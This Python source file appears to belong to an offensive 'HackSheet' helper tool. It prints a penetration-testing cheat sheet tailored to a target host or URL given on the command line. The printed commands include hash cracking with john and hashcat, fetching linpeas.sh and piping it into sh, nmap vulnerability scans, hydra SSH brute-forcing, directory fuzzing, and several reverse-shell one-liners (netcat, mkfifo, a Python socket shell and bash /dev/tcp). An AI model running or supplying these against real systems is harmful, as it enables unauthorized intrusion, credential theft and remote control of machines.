from optparse import OptionParser
from urllib.parse import urlparse

import re
from .color import Color

def title(name):
	print(Color.bold + Color.red, end='')
	print('#-----------------------------------------------#')
	print(f'# {name}' + ' ' * (45 - len(name)) + '#')
	print('#-----------------------------------------------#')
	print(Color.reset, end='')

def header():
	print(Color.blue)
	print('  __    __                   __        ______  __                           __     ')
	print(' |  \  |  \                 |  \      /      \|  \                         |  \    ')
	print(' | ▓▓  | ▓▓ ______   _______| ▓▓   __|  ▓▓▓▓▓▓\ ▓▓____   ______   ______  _| ▓▓_   ')
	print(' | ▓▓__| ▓▓|      \ /       \ ▓▓  /  \ ▓▓___\▓▓ ▓▓    \ /      \ /      \|   ▓▓ \  ')
	print(' | ▓▓    ▓▓ \▓▓▓▓▓▓\  ▓▓▓▓▓▓▓ ▓▓_/  ▓▓\▓▓    \| ▓▓▓▓▓▓▓\  ▓▓▓▓▓▓\  ▓▓▓▓▓▓\\▓▓▓▓▓▓  ')
	print(' | ▓▓▓▓▓▓▓▓/      ▓▓ ▓▓     | ▓▓   ▓▓ _\▓▓▓▓▓▓\ ▓▓  | ▓▓ ▓▓    ▓▓ ▓▓    ▓▓ | ▓▓ __ ')
	print(' | ▓▓  | ▓▓  ▓▓▓▓▓▓▓ ▓▓_____| ▓▓▓▓▓▓\|  \__| ▓▓ ▓▓  | ▓▓ ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓ | ▓▓|  \ ')
	print(' | ▓▓  | ▓▓\▓▓    ▓▓\▓▓     \ ▓▓  \▓▓\\▓▓     ▓▓ ▓▓  | ▓▓\▓▓      \\▓▓     \  \▓▓  ▓▓')
	print('  \▓▓   \▓▓ \▓▓▓▓▓▓▓ \▓▓▓▓▓▓▓\▓▓   \▓▓ \▓▓▓▓▓▓ \▓▓   \▓▓ \▓▓▓▓▓▓▓ \▓▓▓▓▓▓▓   \▓▓▓▓ ')
	print('')
	print('')

def hacksheet(url):
	header()
	title('🔒 Crypto')
	print('john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt')
	print('hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt')
	print('https://hashcat.net/wiki/doku.php?id=example_hashes')
	title('🐧 Linux')
	print('curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh')
	print('curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -O')
	title('🌐 Network')
	print(f"nmap -A {url['host']}")
	print(f"nmap -p- -T4 -v {url['host']}")
	print(f"nmap -A -T4 -sC -sV {url['host']}")
	print(f"nmap -sU -T4 {url['host']}")
	print(f"nmap --script \"default,discovery,exploit,version,vuln\" {url['host']}")
	print(f"hydra -L user.txt -P pass.txt -u -f -t 4 ssh://{url['host']}")
	title('📜 Reverse Shell')
	print('nc -lp 4444')
	print(f"nc {url['host']} 4444 -e /bin/bash")
	print(f"mkfifo /tmp/f;nc {url['host']} 4444 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f")
	print(f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{url['host']}\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
	print(f"bash -c 'bash -i >& /dev/tcp/{url['host']}/4444 0>&1'")
	title('🪟 Windows')
	print(f"smbclient -U user -L //{url['host']}//")
	print(f"smbclient -U user //{url['host']}//shares")
	title('🕸️ Web')
	print(f"ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt:FUZZ -u {url['scheme']}://{url['netloc']}/ -H 'Host: FUZZ.{url['host']}'")
	print(f"gobuster dir -u {url['scheme']}://{url['netloc']}{url['path']} -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 25 -x html,php")
	print(f"feroxbuster -u {url['scheme']}://{url['netloc']}{url['path']} -e -x html,js,php")
	print('mysql -h localhost -u myname -p')
	title('📖 Wordlist')
	print('| Name                      | Path                                                                    |')
	print('|---------------------------|-------------------------------------------------------------------------|')
	print('| SecLists Raft Medium      | `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` |')
	print('| SecLists DNS Top 1M       | `/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`   |')
	print('| n0kovo medium             | `/usr/share/wordlists/n0kovo_subdomains/n0kovo_subdomains_medium.txt`   |')
	print('| Dirbuster Small           | `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`           |')
	print('| Dirbuster Small Lowercase | `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt` |')
	print('| Dirb                      | `/usr/share/dirb/wordlists/common.txt`                                  |')
	print('| Rockyou                   | `/usr/share/wordlists/rockyou.txt`                                      |')

def parseOpt():
	parser = OptionParser(usage='%prog [options] [PORT]')
	options, args = parser.parse_args()
	return options, args

def main():
	global g_opt
	g_opt, args = parseOpt()
	url = {
		'scheme': 'http',
		'host': 'ip',
		'netloc': 'url',
		'path': ''
	}

	if len(args) > 0:
		if re.match(r'^https?://', args[0]):
			parse = urlparse(args[0])
			url['scheme'] = parse.scheme
			url['netloc'] = parse.netloc
			url['host'] = parse.hostname
			url['path'] = parse.path
		else:
			url['host'] = args[0]
			url['netloc'] = args[0]
	hacksheet(url)